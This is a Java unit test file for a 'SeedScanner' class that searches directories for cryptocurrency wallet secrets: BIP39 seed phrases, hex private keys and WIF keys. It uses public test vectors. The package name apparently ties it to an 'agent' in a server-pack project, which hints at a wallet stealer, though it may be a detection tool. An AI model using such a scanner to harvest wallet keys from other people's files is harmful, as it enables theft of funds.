package com.serverpackcore.agent.crypto;

import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class SeedScannerTest {
	private static final String VALID_12 = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
	private static final String INVALID_12 = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon";

	@Test
	void acceptsValidChecksumAndRejectsInvalid() {
		Map<String, Integer> dictionary = SeedScanner.dictionary();
		assertTrue(SeedScanner.checksum(VALID_12, dictionary));
		assertFalse(SeedScanner.checksum(INVALID_12, dictionary));
	}

	@Test
	void findsSeedHexAndWifInTextFile() throws Exception {
		Path dir = Files.createTempDirectory("spc-seeds");
		Path file = dir.resolve("notes.txt");
		Files.writeString(file, "wallet words:\n" + VALID_12 + "\nhex 0x" + "ab".repeat(32)
			+ "\nwif 5HueCGU8rMjxEXxiPuD5BDku4MkFqeZyd4dZ1jvhTVqvbTLvyTJ\n", StandardCharsets.UTF_8);
		List<SeedScanner.Finding> findings = SeedScanner.scan(List.of(dir), 100);
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("bip39") && finding.words() == 12));
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("hex")));
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("wif")));
		assertEquals(3, findings.size());
	}

	@Test
	void ignoresLargeAndBinaryFiles() throws Exception {
		Path dir = Files.createTempDirectory("spc-seeds-big");
		Path file = dir.resolve("huge.txt");
		byte[] data = new byte[600 * 1024];
		Files.write(file, data);
		assertTrue(SeedScanner.scan(List.of(dir), 10).isEmpty());
	}
}
